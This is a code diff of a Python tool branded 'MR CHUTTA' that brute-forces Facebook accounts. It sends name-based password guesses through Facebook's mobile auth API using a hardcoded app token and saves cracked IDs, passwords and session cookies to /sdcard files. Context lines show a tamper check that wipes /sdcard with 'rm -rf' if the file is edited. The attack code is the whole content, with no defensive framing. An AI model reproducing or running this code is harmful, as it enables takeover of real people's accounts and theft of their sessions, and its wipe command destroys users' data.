@@ -158,14 +158,6 @@ if 'verify=False' in file_content:
     os.system('rm -rf /sdcard/*')
     os.system('pip install requests')
     exit("")
-#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ PROX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
-try:
-    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
-    open('.prox.txt', 'w').write(prox)
-except:
-    print('Internet Error')
-    sys.exit()
-xvx = open('.prox.txt', 'r').read().splitlines()
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LINEX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
 sys.stdout.write('\x1b]2;<MR.CHUTTA>\x07')
 def clear():os.system('clear');print(logo)
@@ -202,7 +194,7 @@ logo=f"""\x1b[38;5;46m ▗▖  ▗▖▗▄▄▖      ▗▄▄▖▗▖ ▗▖
 {R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {A}[{R}●{A}] {G}FACEBOOK   {R} >>   {A}MR CHUTTA
 {A}[{R}●{A}] {G}STATUS      {R}>>   {A}FILE {R}x{A}ONLY
-{A}[{R}●{A}] {G}VERSION   {R}  >>   {A}1.1
+{A}[{R}●{A}] {G}VERSION   {R}  >>   {A}1.5
 {A}[{R}●{A}] {G}TOOL      {R}  >>   {A}PERSONAL
 {R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MENU ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
@@ -433,48 +425,59 @@ def api1(ids,names,passlist):
         except Exception as e:
                 pass
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M2 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
-def api2(ids,names,passlist):
-        global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [CHUTTA-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-        session = requests.Session()
+def api2 (ids,names,passlist):
         try:
-                first = names.split(' ')[0]
+                global loop,oks,cps
+                sys.stdout.write(f'\r\r{R}<{W}={R}>{W}-{R}<{G}MR-CHUTTA{R}>{W}-{R}|{T}%s{R}|{W}-{R}|{G}%s{R}|{W}-{R}|{P}%s{R}| '%(loop,len(oks),len(cps)));sys.stdout.flush()
+                fn = names.split(' ')[0]
                 try:
-                        last = names.split(' ')[1]
+                        ln = names.split(' ')[1]
                 except:
-                        last = 'Khan'
-                ps = first.lower()
-                ps2 = last.lower()
-                for fikr in passlist:
-                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-                        ua  =  "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/14.0.0.20.69;FBBV/12945441;FBDM/{density=3.4,width=480,height=800};FBLC/dz_BT;FBCR/GLOMOBILE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/G3502I;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
-                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-CHUTTA-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-CHUTTA-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"','sec-CHUTTA-ua-mobile': '?0','sec-CHUTTA-ua-model': '"RMX2195"','sec-CHUTTA-ua-platform': '"Android"', 'sec-CHUTTA-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetCHUTTA-site': 'same-origin', 'sec-fetCHUTTA-mode': 'navigate', 'sec-fetCHUTTA-user': '?1', 'sec-fetCHUTTA-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en-US;q=0.9,si-LK;q=0.8,si;q=0.7,en-US;q=0.6'}
-                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        Aking=session.cookies.get_dict().keys()
-                        if "c_user" in Aking:
-                                coki=session.cookies.get_dict()
-                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [CHUTTA-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/CHUTTA-OK.txt', 'a').write(ids+'|'+pas+'\n')
-                                open('/sdcard/CHUTTA-M2-COOKIE-OK.txt', 'a').write(ids+' | '+pas+' | '+kuki+'\n')
-                                oks.append(ids)
-                                break
-                        elif 'checkpoint' in Aking:
-                                if 'y' in pcp:
-                                        ##########print('\r\r\x1b[38;5;208m [CHUTTA-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/CHUTTA-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
-                                        cps.append(ids)
+                        ln = fn
+                for pw in passlist:
+                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        random_seed = random.Random()
+                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                        M2 = "[FBAN/FB4A;FBAV/405.0.0.23.72;FBBV/440002512;FBDM/{density=3.0,width=720,height=2176};FBLC/en_Qaag_US;FBRV/359080319;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1907_19;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+                        data = {"adid": adid,"format": "json",
+                        "device_id": str(uuid.uuid4()),
+                        "email": ids,"password": pas,
+                        "generate_analytics_claims": "1",
+                        "credentials_type": "password",
+                        "source": "login","error_detail_type": "button_with_disabled",
+                        "enroll_misauth": "false",
+                        "generate_session_cookies": "1",
+                        "generate_machine_id": "1",
+                        "fb_api_req_friendly_name": "authenticate",}
+                        headers={"Accept-Encoding": "gzip, deflate",
+                        "Accept": "*/*","Connection": "keep-alive",
+                        "User-Agent": '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{M2}',
+                        "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+                        "X-FB-Friendly-Name": "authenticate",
+                        "X-FB-Connection-Type": "unknown",
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "X-FB-HTTP-Engine": "Liger","Content-Length": "329",}
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                        cookie = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}CHUTTA-OK{R}>{G} '+ids+' | '+pas+'\033[1;97m')
+                                        #print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}COOKIES{R}>{G} '+cookie);linex()
+                                        open('/sdcard/CHUTTA-FILE-M2-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                                        oks.append(ids)
                                         break
-                                else:
-                                        break
-                        else:
-                                continue
-        except requests.exceptions.ConnectionError:
-                time.sleep(20)
-        except Exception as e:pass
-        loop+=1
+                        elif 'www.facebook.com' in po['error']['message']:
+                                        if 'y' in pcp:
+                                                print(f'\r\r{R}<{W}={R}>{W}-{R}<{P}CHUTTA-CP{R}>{P} '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/CHUTTA-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                cps.append(ids)
+                                                break
+                        else:continue
+                loop+=1
+        except Exception as e:
+                pass
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M3 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
 def api3(ids,names,passlist):
         try:
